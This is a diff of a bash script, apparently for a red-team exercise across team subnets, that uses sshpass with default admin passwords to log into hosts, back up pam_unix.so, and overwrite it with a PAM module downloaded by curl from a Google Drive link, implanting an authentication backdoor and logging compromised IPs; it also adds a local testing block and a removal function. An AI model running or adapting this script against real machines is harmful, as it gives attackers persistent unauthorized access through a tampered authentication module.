@@ -1,38 +1,49 @@
 #!/bin/bash
 
+# IPs=()
 network_id="10.10"
 number_of_teams=10
 host_ids=(10 20 30 40 50)
 admins=("admin1" "admin2" "admin3")
 default_password="Password1!"
 backdoor_password="yuh"
-IPs=()
 timeout_duration=1
 path_to_pam="/usr/lib/x86_64-linux-gnu/security"
-scoring_link="https://..."
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
-
+scoring_link="https://10.10.10.10"
 touch backdoored_IPs.txt
 
-
+# TESTING
+IPs=("127.0.0.1")
+remove_backdoor() {
+    sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "admin1@127.0.0.1" "
+        echo \"$default_password\" | sudo -S cp $path_to_pam/.pam_unix.so.bak $path_to_pam/pam_unix.so
+    "
+    if [[ $? -eq 0 ]]; then
+        echo "Backdoor successfully removed at 127.0.0.1"
+    fi
+}
+# TESTING
 
 send_backdoor() {
     for IP in "${IPs[@]}"; do
         for admin in "${admins[@]}"; do
             sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
-                echo \"$default_password\" | sudo -S cp $path_to_pam/pam_unix.so $path_to_pam/.pam_unix.so.bak
+                echo \"$default_password\" | sudo -S cp "$path_to_pam/pam_unix.so" "$path_to_pam/.pam_unix.so.bak"
                 echo \"$default_password\" | sudo -S apt install curl -y
-                echo \"$default_password\" | sudo -S curl -o $path_to_pam/pam_unix.so "$backdoor_link"
-                echo \"$default_password\" | sudo -S sleep 5
+                echo \"$default_password\" | sudo -S curl -o "$path_to_pam/pam_unix.so" "$backdoor_link"
             "
 
             if [[ $? -eq 0 ]]; then
-                if ! grep -q "$IP" backdoored_IPs.txt; then
-                    echo "$IP" >> backdoored_IPs.txt
-                fi
+                echo "$IP" >> backdoored_IPs.txt
                 echo "Backdoor successfully implanted at $IP"
                 break
             fi
+
+            # TESTING
+            exit
+            # TESTING
+
         done
     done
 }
@@ -95,18 +106,6 @@ print_unbackdoored_IPs() {
     for IP in "${IPs[@]}"; do
         if ! grep -q "$IP" backdoored_IPs.txt; then
             echo "$IP"
-        fi
-    done
-}
-
-remove_backdoor() {
-    for admin in "${admins[@]}"; do
-        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@127.0.0.1" "
-            echo \"$default_password\" | sudo -S cp $path_to_pam/.pam_unix.so.bak $path_to_pam/pam_unix.so
-        "
-        if [[ $? -eq 0 ]]; then
-            echo "Backdoor successfully removed at 127.0.0.1"
-            break
         fi
     done
 }
